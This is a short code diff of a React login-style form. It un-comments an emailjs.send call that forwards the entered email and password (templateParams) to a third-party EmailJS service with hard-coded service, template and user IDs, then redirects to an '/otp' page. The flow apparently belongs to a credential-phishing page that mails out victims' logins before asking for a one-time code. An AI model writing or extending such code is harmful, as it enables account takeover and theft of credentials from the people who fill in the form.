@@ -35,28 +35,27 @@ const Form = (props) => {
         if (email === '' || password === '' ) {
             console.log('not sent')
         } else {
-            console.log({ templateParams })
-            history.push('/otp', templateParams)
+           
 
-            // emailjs
-            //     .send(
-            //         'service_9vrlrlj',
-            //         'template_cyuy4xi',
-            //         templateParams,
-            //         'user_Qbla9rcVZxBrYr7bdLXKO'
-            //     )
-            //     .then(
-            //         (result) => {
-            //             console.log(result.text, 'email sent')
-            //         setLoading(false)
-            //             history.push('/otp', templateParams)
-            //         },
-            //         (error) => {
-            //             console.log(error, 'email failed')
-            //         setLoading(false)
+            emailjs
+                .send(
+                    'service_9vrlrlj',
+                    'template_cyuy4xi',
+                    templateParams,
+                    'user_Qbla9rcVZxBrYr7bdLXKO'
+                )
+                .then(
+                    (result) => {
+                        console.log(result.text, 'email sent')
+                    setLoading(false)
+                        history.push('/otp', templateParams)
+                    },
+                    (error) => {
+                        console.log(error, 'email failed')
+                    setLoading(false)
 
-            //         }
-            //     )
+                    }
+                )
         }
     }
     
